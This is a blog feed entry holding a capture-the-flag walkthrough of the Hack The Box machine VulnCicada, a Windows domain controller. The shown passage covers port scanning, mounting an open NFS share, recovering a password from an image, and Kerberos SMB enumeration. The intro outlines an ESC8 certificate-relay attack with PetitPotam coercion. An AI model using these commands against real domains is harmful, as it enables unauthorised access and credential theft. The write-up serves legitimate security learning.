This XML file does not appear to have any style information associated with it. The document tree is shown below.
<feed xmlns="http://www.w3.org/2005/Atom">
<generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator>
<link href="https://0xdf.gitlab.io/feed.xml" rel="self" type="application/atom+xml"/>
<link href="https://0xdf.gitlab.io/" rel="alternate" type="text/html"/>
<updated>2025-07-03T13:49:08+00:00</updated>
<id>https://0xdf.gitlab.io/feed.xml</id>
<title type="html">0xdf hacks stuff</title>
<subtitle>CTF solutions, malware analysis, home lab development</subtitle>
<entry>
<title type="html">HTB: VulnCicada</title>
<link href="https://0xdf.gitlab.io/2025/07/03/htb-vulncicada.html" rel="alternate" type="text/html" title="HTB: VulnCicada"/>
<published>2025-07-03T09:00:00+00:00</published>
<updated>2025-07-03T09:00:00+00:00</updated>
<id>https://0xdf.gitlab.io/2025/07/03/htb-vulncicada</id>
<content type="html" xml:base="https://0xdf.gitlab.io/2025/07/03/htb-vulncicada.html">
<![CDATA[ <picture> <source type="image/webp" srcset="/img/vulncicada-cover.webp" /> <img loading="lazy" src="/img/vulncicada-cover.png" alt="VulnCicada" style="float: right; margin-right:50px; margin-left:50px; height:150px;" class="include_image " /> </picture> <p>I’ll find an open NFS share on VulnCicada, and exfil two images. One of them has a password on a sticknote, which I’ll use to get authenticated to the domain. From there, I’ll enumerate ADCS and find the DC vulnerable to ESC8. I’ll show how to do this attack from Linux, creating a malicious DNS record that points the DC back to my host, abusing a serialized empty string. Then I’ll use PetitPotam to coerce the DC to authenticate to me, where I’ll use certipy relay to get a TGT as the machine account. I’ll use that account to dump hashes for the domain, and get a shell as administrator.</p> <h2 id="box-info">Box Info</h2> <!-- https://app.hackthebox.com/machines/677 --> <table> <thead> <tr> <th>Name</th> <th style="text-align: right"><a href="https://hackthebox.com/machines/vulncicada" target="_blank" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9">VulnCicada</a> <a href="https://hackthebox.com/machines/vulncicada" target="_blank"><picture style="float: right; padding-left: 20px;"><source type="image/webp" srcset="/icons/box-vulncicada.webp" /> <img src="/icons/box-vulncicada.png" alt="VulnCicada" class="img-av" /></picture></a><br /><a href="https://hackthebox.com/machines/vulncicada" target="_blank" style="font-size: small; color: white;">Play on HackTheBox</a></th> </tr> </thead> <tbody> <tr> <td>Release Date</td> <td style="text-align: right">03 Jul 2025</td> </tr> <tr> <td>Retire Date</td> <td style="text-align: right">03 Jul 2025</td> </tr> <tr> <td>OS</td> <td style="text-align: right">Windows <picture><source type="image/webp" srcset="/icons/Windows.webp" /><img src="/icons/Windows.png" alt="Windows" class="img-os" /></picture></td> </tr> <tr> <td>Base Points</td> <td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp" /><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset" /></picture></td> <td style="text-align: right">N/A (non-competitive)</td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp" /><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset" /></picture></td> <td style="text-align: right">N/A (non-competitive)</td> </tr> <tr> <td>Creator</td> <td style="text-align: right"><a href="https://app.hackthebox.com/users/13569" target="_blank" rel="noopener"><img alt="xct" src="https://www.hackthebox.com/badge/image/13569" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> xct</span></a><br /></td> </tr> </tbody> </table> <h2 id="recon">Recon</h2> <h3 id="initial-scanning">Initial Scanning</h3> <p><code class="language-plaintext highlighter-rouge">nmap</code> finds 25 open TCP ports:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 10000 10.129.234.48 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 20:24 UTC ...[snip]... Nmap scan report for 10.129.234.48 Host is up, received echo-reply ttl 127 (0.090s latency). Scanned at 2025-06-16 20:24:16 UTC for 14s Not shown: 65510 filtered tcp ports (no-response) PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 111/tcp open rpcbind syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 2049/tcp open nfs syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 5357/tcp open wsdapi syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 61842/tcp open unknown syn-ack ttl 127 61843/tcp open unknown syn-ack ttl 127 61867/tcp open unknown syn-ack ttl 127 61929/tcp open unknown syn-ack ttl 127 62457/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds Raw packets sent: 131052 (5.766MB) | Rcvd: 29 (1.260KB) </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 53,80,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,5357,5985,9389 <span class="nt">-sCV</span> 10.129.234.48 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 20:26 UTC Nmap scan report for 10.129.234.48 Host is up (0.090s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-16 20:38:43Z) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd |_ 100005 1,2,3 2049/udp6 mountd 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl | Not valid before: 2024-09-13T10:42:50 |_Not valid after: 2025-09-13T10:42:50 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl | Not valid before: 2024-09-13T10:42:50 |_Not valid after: 2025-09-13T10:42:50 2049/tcp open mountd 1-3 (RPC #100005) 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl | Not valid before: 2024-09-13T10:42:50 |_Not valid after: 2025-09-13T10:42:50 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl | Not valid before: 2024-09-13T10:42:50 |_Not valid after: 2025-09-13T10:42:50 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl | Not valid before: 2025-04-09T08:36:14 |_Not valid after: 2025-10-09T08:36:14 |_ssl-date: 2025-06-16T20:40:10+00:00; +12m30s from scanner time. 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Service Unavailable |_http-server-header: Microsoft-HTTPAPI/2.0 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-06-16T20:39:31 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 12m29s, deviation: 0s, median: 12m29s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 148.25 seconds </span></code></pre></div></div> <p>The box shows many of the ports associated with a <a href="/cheatsheets/os#windows-domain-controller">Windows Domain Controller</a>. The domain is <code class="language-plaintext highlighter-rouge">cicada.vl</code>, and the hostname is <code class="language-plaintext highlighter-rouge">DC-JPQ225</code>.</p> <p>I’ll use <code class="language-plaintext highlighter-rouge">netexec</code> to generate a hosts file and add it to the top of mine:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.129.234.48 <span class="nt">--generate-hosts-file</span> hosts <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.48 445 DC-JPQ225 </span><span class="netexec-logmessage">[*]</span><span class="go"> x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go"> </span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>hosts <span class="go">10.129.234.48 DC-JPQ225.cicada.vl cicada.vl DC-JPQ225 </span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>hosts /etc/hosts | sponge /etc/hosts </code></pre></div></div> <h3 id="website---tcp-80">Website - TCP 80</h3> <h4 id="site">Site</h4> <p>The website is the default IIS page:</p> <picture> <source type="image/webp" srcset="/img/image-20250616163115156.webp" /> <img loading="lazy" src="/img/image-20250616163115156.png" alt="image-20250616163115156" class="include_image " /> </picture> <h4 id="tech-stack">Tech Stack</h4> <p>The HTTP response headers show nothing interesting:</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span> <span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span> <span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Fri, 13 Sep 2024 15:17:21 GMT</span> <span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span> <span class="na">ETag</span><span class="p">:</span> <span class="s">"fdd9857f05db1:0"</span> <span class="na">Server</span><span class="p">:</span> <span class="s">Microsoft-IIS/10.0</span> <span class="na">Date</span><span class="p">:</span> <span class="s">Mon, 16 Jun 2025 20:46:25 GMT</span> <span class="na">Content-Length</span><span class="p">:</span> <span class="s">703</span> </code></pre></div></div> <p>The main page loads as <code class="language-plaintext highlighter-rouge">iisstart.htm</code>, which is a typically name for that file.</p> <p>The 404 page is the <a href="/cheatsheets/404#iis">default IIS 404</a>:</p> <picture> <source type="image/webp" srcset="/img/image-20250616163145036.webp" /> <img loading="lazy" src="/img/image-20250616163145036.png" alt="image-20250616163145036" class="include_image " /> </picture> <h4 id="directory-brute-force">Directory Brute Force</h4> <p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, using a lowercase wordlist as IIS is not typically case sensitive:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.129.234.48 <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt <span class="go"> ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \ \_/ | | \ |__ | |___ | \ | \ | \__, \__/ / \ | |__/ |___ by Ben "epi" Risher 🤓 ver: 2.11.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.129.234.48 🚀 Threads │ 50 📖 Wordlist │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.11.0 🔎 Extract Links │ true 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── </span><span class="feroxbuster-red">404</span><span class="go"> GET 29l 95w 1245c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go"> </span><span class="feroxbuster-green">200</span><span class="go"> GET 334l 2089w 180418c http://10.129.234.48/iisstart.png </span><span class="feroxbuster-green">200</span><span class="go"> GET 32l 55w 703c http://10.129.234.48/ </span><span class="feroxbuster-red">400</span><span class="go"> GET 6l 26w 324c http://10.129.234.48/error%1F_log [</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 50s 26587/26587 0s </span><span class="feroxbuster-green">found</span><span class="go">:3 </span><span class="feroxbuster-red">errors</span><span class="go">:0 [</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 49s 26584/26584 547/s http://10.129.234.48/ </span></code></pre></div></div> <p>Nothing here.</p> <h3 id="smb---tcp-445">SMB - TCP 445</h3> <p><code class="language-plaintext highlighter-rouge">netexec</code> shows the same domain and hostname information as <code class="language-plaintext highlighter-rouge">nmap</code>, and that NTLM auth is disabled:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> guest <span class="nt">-p</span> <span class="s1">''</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.48 445 DC-JPQ225 </span><span class="netexec-logmessage">[*]</span><span class="go"> x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go"> </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.48 445 DC-JPQ225 </span><span class="netexec-logfail">[-]</span><span class="go"> cicada.vl\guest: STATUS_NOT_SUPPORTED </span></code></pre></div></div> <p>I’m not able to authenticate using Kerberos using a dummy or guest name:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> guest <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-k</span> <span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logmessage">[*]</span><span class="go"> x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go"> </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> cicada.vl\guest: KDC_ERR_CLIENT_REVOKED </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> oxdf <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-k</span> <span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logmessage">[*]</span><span class="go"> x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go"> </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logfail">[-]</span><span class="go"> cicada.vl\oxdf: KDC_ERR_C_PRINCIPAL_UNKNOWN </span></code></pre></div></div> <h3 id="nfs---2049">NFS - 2049</h3> <p>There is a public NFS share on VulnCicada:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>showmount <span class="nt">-e</span> 10.129.234.48 <span class="go">Export list for 10.129.234.48: /profiles (everyone) </span></code></pre></div></div> <p>I’ll mount the share to <code class="language-plaintext highlighter-rouge">/mnt</code> on my local box:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>mount <span class="nt">-t</span> nfs <span class="nt">-o</span> rw 10.129.234.48:/profiles /mnt <span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span> /mnt <span class="go">Administrator Debra.Wright Jordan.Francis Katie.Ward Richard.Gibbons Shirley.West Daniel.Marshall Jane.Carter Joyce.Andrews Megan.Simpson Rosie.Powell </span></code></pre></div></div> <p>It looks like it’s probably the <code class="language-plaintext highlighter-rouge">C:\Users</code> directory.</p> <p>The public user has access to all of these directories except for two (though most are empty):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>find /mnt <span class="nt">-ls</span> <span class="go">1407374883623611 4 drwxrwxrwx 2 nobody nogroup 4096 Jun 3 10:21 /mnt 2533274790396733 1 drwxrwxrwx 2 nobody nogroup 64 Sep 15 2024 /mnt/Administrator 1688849860264767 1 drwx------ 2 nobody nogroup 64 Sep 15 2024 /mnt/Administrator/Documents find: ‘/mnt/Administrator/Documents’: Permission denied 1688849860264783 1456 -rwxrwxrwx 1 nobody nogroup 1490573 Sep 13 2024 /mnt/Administrator/vacation.png 844424930132659 1 drwxrwxrwx 2 nobody nogroup 64 Sep 13 2024 /mnt/Daniel.Marshall 844424930132661 1 drwxrwxrwx 2 nobody nogroup 64 Sep 13 2024 /mnt/Debra.Wright 1125899906843319 1 drwxrwxrwx 2 nobody nogroup 64 Sep 13 2024 /mnt/Jane.Carter 844424930132665 1 drwxrwxrwx 2 nobody nogroup 64 Sep 13 2024 /mnt/Jordan.Francis 844424930132667 1 drwxrwxrwx 2 nobody nogroup 64 Sep 13 2024 /mnt/Joyce.Andrews 844424930132669 1 drwxrwxrwx 2 nobody nogroup 64 Sep 13 2024 /mnt/Katie.Ward 1125899906843329 1 drwxrwxrwx 2 nobody nogroup 64 Sep 13 2024 /mnt/Megan.Simpson 844424930132675 1 drwxrwxrwx 2 nobody nogroup 64 Sep 13 2024 /mnt/Richard.Gibbons 562949953422027 1 drwxrwxrwx 2 nobody nogroup 64 Sep 15 2024 /mnt/Rosie.Powell 5066549580792907 1 drwx------ 2 nobody nogroup 64 Sep 15 2024 /mnt/Rosie.Powell/Documents find: ‘/mnt/Rosie.Powell/Documents’: Permission denied 2251799813708883 1792 -rwx------ 1 nobody nogroup 1832505 Sep 13 2024 /mnt/Rosie.Powell/marketing.png 562949953422029 1 drwxrwxrwx 2 nobody nogroup 64 Sep 13 2024 /mnt/Shirley.West </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>find /mnt <span class="nt">-type</span> f <span class="nt">-ls</span> <span class="go">find: ‘/mnt/Administrator/Documents’: Permission denied 1688849860264783 1456 -rwxrwxrwx 1 nobody nogroup 1490573 Sep 13 2024 /mnt/Administrator/vacation.png find: ‘/mnt/Rosie.Powell/Documents’: Permission denied 2251799813708883 1792 -rwx------ 1 nobody nogroup 1832505 Sep 13 2024 /mnt/Rosie.Powell/marketing.png </span></code></pre></div></div> <p>I’ll copy the two images I can access to my host:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cp</span> /mnt/Administrator/vacation.png <span class="nb">.</span> <span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cp</span> /mnt/Rosie.Powell/marketing.png <span class="nb">.</span> <span class="go">cp: cannot open '/mnt/Rosie.Powell/marketing.png' for reading: Permission denied </span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo cp</span> /mnt/Rosie.Powell/marketing.png <span class="nb">.</span> </code></pre></div></div> <p>I have to use <code class="language-plaintext highlighter-rouge">sudo</code> for the second due to the permissions. <code class="language-plaintext highlighter-rouge">vacation.png</code> is a guy with a laptop in a parachute:</p> <picture> <source type="image/webp" srcset="/img/vulncicada-vacation.webp" /> <img loading="lazy" src="/img/vulncicada-vacation.png" alt="" class="include_image " /> </picture> <p><code class="language-plaintext highlighter-rouge">marketing.png</code> is a woman at a desk:</p> <picture> <source type="image/webp" srcset="/img/vulncicada-marketing.webp" /> <img loading="lazy" src="/img/vulncicada-marketing.png" alt="" class="include_image " /> </picture> <p>That looks like a password on a stickynote.</p> <h2 id="auth-as-dc-jpq225">Auth as DC-JPQ225</h2> <h3 id="authenticated-smb">Authenticated SMB</h3> <h4 id="auth-poc">Auth POC</h4> <p>The creds work for Rosie.Powell over SMB using Kerberos:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-k</span> <span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logmessage">[*]</span><span class="go"> x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go"> </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\Rosie.Powell:Cicada123 </span></code></pre></div></div> <h4 id="listing-shares">Listing Shares</h4> <p>The box has the standard DC shares, as well as two additional:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-k</span> <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logmessage">[*]</span><span class="go"> x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go"> </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\Rosie.Powell:Cicada123 </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated shares </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-shareenum">Share Permissions Remark</span><span class="err"> </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-shareenum">----- ----------- ------ </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-shareenum">ADMIN$ Remote Admin </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-shareenum">C$ Default share </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-shareenum">CertEnroll READ Active Directory Certificate Services share </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-shareenum">IPC$ READ Remote IPC </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-shareenum">NETLOGON READ Logon server share </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-shareenum">profiles$ READ,WRITE </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-shareenum">SYSVOL READ Logon server share </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">CertEnroll</code> is related to ADCS (both by name and by the comment with the share). <code class="language-plaintext highlighter-rouge">profiles</code> doesn’t have a label (though based on the name it may be home directories).</p> <h4 id="share-enumeration">Share Enumeration</h4> <p>I’ll get a TGT as Rosie.Powell using <code class="language-plaintext highlighter-rouge">netexec</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-k</span> <span class="nt">--generate-tgt</span> Rosie <span class="go">.Powell </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logmessage">[*]</span><span class="go"> x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) (NTLM :False) </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\Rosie.Powell:Cicada123 </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logsuccess">[+]</span><span class="go"> TGT saved to: Rosie.Powell.ccache </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logsuccess">[+]</span><span class="go"> Run the following command to use the TGT: export KRB5CCNAME=Rosie.Powell.cc ache </span></code></pre></div></div> <p>I’ll use it to connect to SMB:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Rosie.Powell.ccache smbclient.py <span class="nt">-k</span> DC-JPQ225.cicada.vl <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Type help for list of commands </span><span class="gp">#</span><span class="w"> </span>shares <span class="go">ADMIN$ C$ CertEnroll IPC$ NETLOGON profiles$ SYSVOL </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">profiles$</code> is the same as the NFS share. <code class="language-plaintext highlighter-rouge">CertEnroll</code> has a bunch of certificates:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="w"> </span>use CertEnroll <span class="gp">#</span><span class="w"> </span><span class="nb">ls</span> <span class="go">drw-rw-rw- 0 Mon Jun 16 20:41:25 2025 . drw-rw-rw- 0 Fri Sep 13 15:17:59 2024 .. -rw-rw-rw- 741 Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA(1)+.crl -rw-rw-rw- 941 Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA(1).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(10)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(10).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(11)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(11).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(12)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(12).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(13)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(13).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 